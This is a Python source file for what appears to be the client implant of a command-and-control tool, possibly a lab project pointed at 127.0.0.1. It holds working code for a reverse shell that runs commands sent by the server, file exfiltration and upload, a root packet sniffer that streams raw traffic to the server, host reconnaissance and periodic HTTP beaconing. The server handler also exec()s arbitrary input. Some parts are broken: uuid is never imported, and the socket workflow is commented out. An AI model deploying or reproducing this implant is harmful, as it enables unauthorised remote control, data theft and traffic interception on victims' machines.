#!/usr/bin/python3

"""
client server that handles a socket connection with the
ability for features such as:
rev shell, upload/ download file, packet sniffing, services, processes,
netstat and checking hash files
"""
import socket
import ssl
import subprocess
import os
import sys
import hashlib
import struct
import platform
import re
import shutil
import stat
import pwd
import grp
import threading
import json
import http.client
import urllib.parse
from typing import Tuple
from getpass import getuser
from time import sleep
from datetime import datetime


address = "127.0.0.1", 80


class Client:
    """Class handles all client side funtionality"""

    def socketinitilsation(self):
        """initalises the socket and wraps it in the context for TLS"""
        global ssl_sock, context  # sets the command for global use
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        ssl_sock = context.wrap_socket(client_socket, server_side=False)

    def connection(self):
        """
        waits for a connection to drop in, and
        re-attempts every 5s if it fails
        """
        while True:
            try:
                ssl_sock.connect(address)
                received_data = self.receive_data(ssl_sock)
                port = (ssl_sock.getsockname()[1])
                self.authentication((received_data + str(port))[::-1])
                self.send_data(ssl_sock,
                               self.authentication((received_data +
                                                    str(port))[::-1]))
                break
            except BaseException:
                sleep(5)

    def check_listener(self):
        """checks if the server wants packet sniffing"""
        ans = self.receive_data(ssl_sock).lower()
        if ans == "true":
            global sharkport
            sharkport = self.receive_data(ssl_sock)
            try:
                sharkthread = threading.Thread(
                    target=self.sharklistener, args=())
                sharkthread.start()
            except KeyboardInterrupt:
                pass
        else:
            pass
        return

    def sendhostname(self):
        """sends the hostname to the client"""
        self.send_data(ssl_sock, socket.gethostname())
        return

    def authentication(self, auth_key):
        """calculates the authentication key and returns the correct hash"""
        auth_key = hashlib.sha512(auth_key.encode()).hexdigest()
        return auth_key

    def serverhandler(self):
        """
        server handler that can shutdown the socket
        or execute the command to call functions
        """
        while True:
            deco_data = self.receive_data(ssl_sock)
            if deco_data == "shutdown":
                ssl_sock.close()
                sys.exit(1)
            if deco_data != "":
                data = (f'self.{deco_data}()')
            try:
                exec(data)
            except SyntaxError:
                break
        return

    def sharklistener(self):
        """packet sniffer function, sets up another socket on the recieved port
        the client checks if it is run as root and if this is true
        a raw socket is then created.
        Once this is set up all packets are streamed across the socket. """
        try:
            port = int(sharkport)  # sets the port
            sharkaddress = address[0], port  # sets the address
            # context for TLS
            client_socket2 = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM, 0)
            context2 = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context2.check_hostname = False
            context2.verify_mode = ssl.CERT_NONE
            ssl_sock2 = context.wrap_socket(client_socket2, server_side=False)
            ssl_sock2.connect(sharkaddress)
            # gets uid for the processes
            sudo = os.geteuid()
            # sends the uid across
            ssl_sock2.send(str(sudo).encode())
            # if sudo create the socket and stream packets
            if sudo == 0:
                try:
                    rawsock = socket.socket(
                        socket.AF_PACKET, socket.SOCK_RAW,
                        socket.htons(0x0003))
                    while True:
                        packet_data, _ = rawsock.recvfrom(65535)
                        ssl_sock2.send(packet_data)
                except PermissionError:
                    pass
            return
        except BaseException:
            return

    def send_data(self, sendsocket, data):
        """
        function that sends data across a socket,
        socket connection and data gets fed in, the length
        of data is then calculated. the socket sends a header file packed
        with struct that sends the total length and chunk size
        The data is sent in chunks of 4096 until the last chunk where only
        the required amount is sent. the function allows for raw bytes and
        strings to be sent for multipl data types to be sent.
        """
        total_length = len(data)
        chunk_size = 4096
        sendsocket.sendall(struct.pack('!II', total_length, chunk_size))
        for i in range(
                0,
                total_length,
                chunk_size):
            end_index = (i + chunk_size if i + chunk_size < total_length
                         else total_length)
            chunk = data[i:end_index]
            try:
                sendsocket.sendall(chunk.encode())
            except AttributeError:
                sendsocket.sendall(chunk)
        return

    def receive_data(self, recvsocket):
        """
        function that recieves data
        first the header is recieved with the chunk size and total length
        after this it recieves data in the chunk size until
        the last packet where it is the remaining length
        """
        try:
            total_length, chunk_size = struct.unpack(
                '!II', recvsocket.recv(8))
            received_data = b''
            while total_length > 0:
                chunk = recvsocket.recv(min(chunk_size, total_length))
                received_data += chunk
                total_length -= len(chunk)
            try:
                received_data = received_data.decode(
                    "utf-8")
            except UnicodeDecodeError:
                pass
        except struct.error:
            pass
        try:
            return received_data
        except UnboundLocalError:
            return

    def shell(self):
        """
        reverse shell, sends the user and CWD. and then allows a
        command to be executed then sends the output back.
        """
        self.send_data(
            ssl_sock, f"{getuser()}<sep>{os.getcwd()}")
        while True:
            command = self.receive_data(ssl_sock)
            split_command = command.split()
            if command.lower() == "exit":
                break
            if split_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(split_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            else:
                output = subprocess.getoutput(command)
            cwd = os.getcwd()
            response = f"{output}<sep>{cwd}"
            self.send_data(ssl_sock, response)
        return

    def calculate_cpu_usage(self, pid):
        """calculate the cpu usage of a process"""
        try:
            with open(f'/proc/{pid}/stat') as stat_file:
                stat_info = stat_file.read().split()
            utime = int(stat_info[13])  # user time
            stime = int(stat_info[14])  # system time
            cutime = int(stat_info[15])  # children user time
            cstime = int(stat_info[16])  # children system time
            total_time = utime + stime + cutime + cstime
            # get total cpu time
            with open('/proc/stat') as stat_file:
                cpu_info = stat_file.readline().split()[1:]
            total_cpu_time = sum(map(int, cpu_info))
            cpu_percent = (total_time / total_cpu_time) * 100

            return cpu_percent
        except FileNotFoundError:
            return 0.0

    def list_processes(self):
        """lists all processes on the system"""
        allprocesses = ""
        # loops through entries in /proc
        for pid in os.listdir('/proc'):
            # checks if the file is a PID
            if pid.isdigit():
                try:
                    # status file contains details on the process
                    with open(f'/proc/{pid}/status') as status_file:
                        status_lines = status_file.readlines()

                    process_info = {}
                    # loops each line in status lines
                    for line in status_lines:
                        # splits each into key value using
                        parts = line.split(':')
                        # strips anywhitespace and stores in a dictionary
                        if len(parts) == 2:
                            key, value = parts[0].strip(), parts[1].strip()
                            process_info[key] = value
                    process_name = process_info.get(
                        'Name', 'N/A')  # retrieves the process name or n/a
                    cpu_usage = self.calculate_cpu_usage(
                        pid)  # calculates cpu usage

                    entry = (
                        f"PID:{pid} Name:{process_name} CPU Usage:",
                        f"{cpu_usage:.2f}\n")
                    allprocesses += ' '.join(entry)
                except FileNotFoundError:
                    pass
        self.send_data(ssl_sock, allprocesses)
        return

    def systeminfo(self):
        """gets system info of the command
        sends a crafted string of useful information about the system"""

        self.send_data(ssl_sock, str(f"""SYSTEM INFO:\n
System = {platform.system()}
platform-release = {platform.release()}
platform-version = {platform.version()}
architecture = {platform.machine()}
hostname = {socket.gethostname()}
ip-address = {socket.gethostbyname(socket.gethostname())}
mac-address = {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
processor = {platform.processor()}"""))
        return

    def checkfiles(self):
        """
        sends hashes of a file back to the server
        to be compared against the database
        """
        dir = self.receive_data(ssl_sock)
        length = 0
        try:
            files = os.scandir(dir)
            filesList = []
            try:
                for entry in files:
                    if entry.is_file():
                        length += 1
                        filesList.append(entry.name)
            except PermissionError:
                pass
            self.send_data(ssl_sock, str(length))
            try:
                for file in filesList:
                    try:
                        file = f"{dir}/{file}"
                        self.hashfile(file)
                    except IsADirectoryError:
                        self.send_data(ssl_sock, "Error")
                        self.send_data(ssl_sock, f"{file} is a directory")
                    except PermissionError:
                        self.send_data(ssl_sock, file)
                        self.send_data(ssl_sock, "Permission Error")
            except (FileNotFoundError):
                self.send_data(ssl_sock, "Error")
                self.send_data(ssl_sock, f"{dir} does not exist")
        except NotADirectoryError:
            length = 1
            self.send_data(ssl_sock, str(length))
            try:
                self.hashfile(dir)
            except PermissionError:
                self.send_data(ssl_sock, dir)
                self.send_data(ssl_sock, "Permission Error")

    def hashfile(self, file):
        """
        function opens a file, hashes it and then sends the hash
        and filename to the server
        """
        with open(file, 'rb') as directoryFiles:
            size = os.path.getsize(file)
            data = directoryFiles.read(size)
            directoryFiles.close()
            self.send_data(ssl_sock, file)
            self.send_data(ssl_sock, hashlib.sha256(
                data).hexdigest())
            return

    def send_file(self):
        """ send a file from the client to the server"""
        filename = self.receive_data(ssl_sock)  # grabs the requested file name
        try:
            with open(filename, "rb") as f:  # trys to open the file as bytes
                self.send_data(
                    ssl_sock, f.read(
                        os.path.getsize(filename)))
                f.close()
        except FileNotFoundError:
            self.send_data(ssl_sock, "Error")
            self.send_data(ssl_sock, "File doesn't exist")
        except PermissionError:
            self.send_data(ssl_sock, "Error")
            self.send_data(
                ssl_sock,
                "You do not have permission to access this file")
        except IsADirectoryError:
            self.send_data(ssl_sock, "Error")
            self.send_data(ssl_sock, "This is a directory")

    def recv_file(self):
        """ recieve a file from the server to the client"""
        filename = self.receive_data(ssl_sock)
        if filename == "break":
            return
        data = self.receive_data(ssl_sock)
        if isinstance(data, str):
            data = data.encode()
        with open(filename, "wb") as f:
            f.write(data)
            f.close()
        self.send_data(ssl_sock, str(self.check_file_exists(filename)))
        return

    def check_file_exists(self, file):
        """check a file eixsts on the machine"""
        return os.path.isfile(file)

    def list_services(self):
        """list services and grab the status of the service"""
        OS = platform.system()  # gets the OS
        if OS == "Linux":
            # Read the /etc/os-release file to get distribution-specific
            # information
            with open('/etc/os-release', 'r') as file:
                for line in file:
                    if line.startswith('NAME='):
                        release = (line.split('=')[1].strip('" \n'))
            if release == "Fedora Linux":
                path = "/etc/systemd/system"
                # need to add /usr/lib/systemd/system for red hat as well
            else:
                path = "/etc/system/system"
        if OS == 'Linux':  # if the OS is Linux
            services = ""
            if os.path.exists(path):  # checks system folder exists
                for root, dirs, files in os.walk(
                        path):  # loads all files into data
                    for file in files:  # for each file in the files
                        if file.endswith(
                                '.service'):  # check it ends in .service
                            # join path to the filename
                            service_file = os.path.join(path, file)
                            status = "Unknown"  # set status to unkown
                            if os.path.exists(
                                    service_file):
                                with open(service_file, "r") as f:
                                    lines = f.readlines()  # read the lines
                                    # looks for key words as to what the status
                                    # of the service is
                                    for line in lines:
                                        if line.startswith("ExecStart="):
                                            status = "Running"
                                        elif line.startswith("ExecStop="):
                                            status = "Stopped"
                                        elif line.startswith("Restart="):
                                            if "always" in line.lower():
                                                status = "Running (Restart)"
                                            else:
                                                status = "Stopped (No Restart)"
                                        elif line.startswith("Type="):
                                            if "oneshot" in line.lower():
                                                status = "Stopped (One-Shot)"
                            # appends the service name and status to the bottom
                            services += f"Service: {file}   Status: {status}\n"
            if os.path.exists("/etc/init.d"):  # checks init.d exists
                for file in os.listdir("/etc/init.d"):
                    if os.path.isfile(
                        os.path.join(
                            "/etc/init.d",
                            file)):
                        service_file = os.path.join("/etc/init.d", file)
                        status = "Unkown"  # sets status to unkown
                        if os.path.exists(service_file):
                            status = "Running" if os.path.islink(
                                service_file) else "Stopped"  # grab the status
                        # appends the service name and status to the bottom
                        services += f"Name: {file} Status: {status}\n"
        self.send_data(ssl_sock, services)  # send the data across

    def disk_usage(self):
        """grabs the disk usuage for the OS disk in gb"""
        usage = shutil.disk_usage("/")
        self.send_data(
            ssl_sock,
            f"Disk usage for /: \n Total: {usage.total / (1024**3):.3f} GB\n"
            f" Used: {usage.used / (1024**3):.3f} GB\n"
            f" Free: {usage.free / (1024**3):.3f} GB\n"
        )
        return

    def ip_to_str(self, ip):
        """converts an ip_address from an int to a string and formats"""
        return socket.inet_ntoa(struct.pack('<I', ip))

    def parse_tcp_line(self, line):
        """Parses a line of TCP connection information
        splits the line into fields and extracts the information from it"""
        fields = line.split()
        local_ip, local_port = fields[1].split(':')
        remote_ip, remote_port = fields[2].split(':')
        local_ip_str = self.ip_to_str(int(local_ip, 16))
        local_port_int = int(local_port, 16)
        remote_ip_str = self.ip_to_str(int(remote_ip, 16))
        remote_port_int = int(remote_port, 16)
        state = fields[3]
        return (f"LocalIP: {local_ip_str} LocalPort: {local_port_int}, "
                f"RemoteIP: {remote_ip_str} RemotePort: {remote_port_int}, "
                f"State: {state}")

    def netstat(self):
        """reads netsat files and formats them to make them readable"""
        with open('/proc/net/tcp', 'r') as f:  # load file
            lines = f.readlines()

        for line in lines[1:]:
            # parses the data to make it in a readable format then sends it
            # line by line
            self.send_data(ssl_sock, f"{str(self.parse_tcp_line(line))}\n")
        # sends the break to signify last line
        self.send_data(ssl_sock, "break")

    def list_dir(self):
        """
        list directorys without using on system
        binaries in the style of ls -al
        """
        message = ""
        directory_path = self.receive_data(ssl_sock)  # recieves the path
        try:
            # loads the contents of the directory
            contents = os.listdir(directory_path)
            for item in contents:
                item_path = os.path.join(
                    directory_path, item)  # grabs the item path
                stat_info = os.stat(item_path)  # grabs the stat_info

                mode = stat_info.st_mode  # grabs the mode
                permissions = stat.filemode(mode)  # grabs the permissions

                num_links = stat_info.st_nlink  # grabs any nunmlinks

                uid = stat_info.st_uid  # grabs UID
                gid = stat_info.st_gid  # grabs GID
                owner = pwd.getpwuid(uid).pw_name  # grabs the owner
                group = grp.getgrgid(gid).gr_name  # grabs the group

                size = stat_info.st_size

                modified_time = datetime.fromtimestamp(
                    stat_info.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                # formats the message line by line
                message += (f"{permissions} {num_links} {owner} {group} " +
                            f"{size} {modified_time} {item}\n")
        except PermissionError:
            message = "Error: You do not have permissions to view this folder"
        except (NotADirectoryError, FileNotFoundError):
            message = "Error: This is not a directory"
        self.send_data(ssl_sock, message)  # send message over socket

    def get_request(self, url: str) -> Tuple[int, str]:
        parsed_url = urllib.parse.urlparse(url)
        conn = http.client.HTTPConnection(parsed_url.netloc)
        conn.request("GET", parsed_url.path + ("?" + parsed_url.query if parsed_url.query else ""))
        response = conn.getresponse()
        data = response.read().decode()
        conn.close()

        return response.status, data

    def httpConnection(self) -> Tuple[int, str]:
        """beacon to the server"""
        r = self.get_request(f"http://{address[0]}:{address[1]}/connection?name={socket.gethostname()}&os={platform.system()}&address={socket.gethostbyname(socket.gethostname())}")
        print(r)
        if r[0] == 200:
            data = json.loads(r[1])
            return data['timer'], data['uuid']
        else:
            raise Exception(f"Failed to connect to server: {r[0]} {r[1]}")

    def beacon(self, timer, id):
        """beacon to the server"""
        while True:
            url = f"http://{address[0]}:{address[1]}/beacon?id={id}"
            r = self.get_request(url)
            print(r)
            try:
                data = json.loads(r[1])
            except json.JSONDecodeError:
                print("Failed to decode JSON response")
                continue
            if "timer" in data:
                timer = data["timer"]
                print(f"Sleeping for {timer} seconds")
            sleep(int(timer))



if __name__ == '__main__':
    try:
        client = Client()  # calls the client class
        while True:
            # client.socketinitilsation()  # starts socket
            # client.connection()
            timer, id = client.httpConnection()
            client.beacon(timer, id)
            # client.sendhostname()  # sends hostname
            # client.send_data(ssl_sock, "Python")
            # client.check_listener()  # checks listner
            # client.serverhandler()  # starts server handler
    except KeyboardInterrupt:
        print("exit")
